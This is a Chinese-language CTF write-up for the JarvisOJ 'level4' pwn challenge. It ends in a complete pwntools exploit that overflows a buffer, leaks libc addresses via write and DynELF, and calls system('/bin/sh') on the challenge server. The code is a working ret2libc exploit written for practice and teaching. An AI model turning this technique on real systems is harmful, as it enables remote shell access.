---
layout:     post
title:      jarvisoj [XMAN]level4
author:     wooy0ung
tags: 		linux elf pwn
category:  	ctf
---


### 0x00 introduction

```
Problem Address:
https://www.jarvisoj.com

Download:
https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0

Address:
nc pwn2.jarvisoj.com 9880
```
<!-- more -->


### 0x01 可执行文件特征

```
file level4
checksec level4
chmod a+x ./level4
./level4
```

![](/assets/img/ctf/pwn/2017-06-22-jarvisoj-level4/0x00.png)


### 0x02 放到IDA分析

没有system调用，没有libc，接下来用write来泄漏信息，通过DynELF找到system地址

![](/assets/img/ctf/pwn/2017-06-22-jarvisoj-level4/0x01.png)

查看缓冲区

![](/assets/img/ctf/pwn/2017-06-22-jarvisoj-level4/0x02.png)


![](/assets/img/ctf/pwn/2017-06-22-jarvisoj-level4/0x03.png)


### 0x03 最终的exploit


```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF('./level4')
write_plt_addr = elf.plt['write']
read_plt_addr = elf.plt['read']
bss_base = elf.bss()
main_addr = elf.symbols['main']
junk = 'A' * (0x88 + 0x04)

Io = remote("pwn2.jarvisoj.com", 9880)

def leak(addr):
	payload = junk + p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(addr) + p32(4)
	Io.send(payload)
	leaked = Io.recv(4)
	print '[%s] -> [%s] = [%s]' % (hex(addr), hex(u32(leaked)), repr(leaked))
	return leaked

d = DynELF(leak, elf = ELF('./level4'))  # 调用DynELF泄漏地址信息
system_addr = d.lookup('system', 'libc')  # 查找system的地址
print '[system()] -> [%s]' % (hex(system_addr))

payload = junk + p32(read_plt_addr) + p32(main_addr) + p32(0) + p32(bss_base) + p32(8)
Io.send(payload)

Io.send('/bin/sh\x00')  # 将字符串"/bin/sh\0"写入bss

payload = junk + p32(system_addr) + p32(0) + p32(bss_base)  # 调用system("/bin/sh")
Io.send(payload)

Io.interactive()
```

得到falg

![](/assets/img/ctf/pwn/2017-06-22-jarvisoj-level4/0x04.png)